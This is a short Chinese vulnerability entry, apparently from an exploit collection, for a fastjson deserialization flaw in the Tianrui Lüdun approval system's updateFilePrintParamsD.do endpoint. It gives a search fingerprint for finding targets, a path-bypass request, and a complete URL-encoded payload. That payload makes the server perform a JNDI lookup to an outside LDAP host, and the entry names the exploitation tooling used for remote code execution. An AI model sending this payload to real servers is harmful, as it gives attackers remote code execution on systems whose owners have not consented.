# 天锐绿盾审批系统updateFilePrintParamsD.do存在反序列化漏洞

- **系统**：天锐绿盾　|　**类型**：反序列化　|　**CVE**：—
- **指纹**：`app="TIPPAY-绿盾审批系统"`
- **请求**：`POST /trwfe/login.jsp/.%2e/task/updateFilePrintParamsD.do HTTP/1.1`

**请求体 / payload**
```
fastjson的版本1.2.7版本，非最新版，则存在反序列化rce漏洞的。
再看updateFilePrintParamsD.do 的实现部分
params参数被直接用于JSONObject.parseObject进行反序列化操作，非常明显的fastjson反序列化漏洞没啥好分析的。
使用Java Chains的JNDILDAPDeserializePayload下的Fastjson反序列化链配合One For All Echo 回显来完成利用。
Host:
X-Authorization: dir
Content-Type: application/x-www-form-urlencoded
params=%7B%0A++++%22%40type%22%3A+%22com.sun.rowset.JdbcRowSetImpl%22%2C%0A++++%22dataSourceName%22%3A+%22ldap%3A%2F%2F192.168.168.11%3A50389%2F165c51%22%2C%0A++++%22autoCommit%22%3A+true%0A%7D&processInstanceId=1
```
- **预期**：200　|　—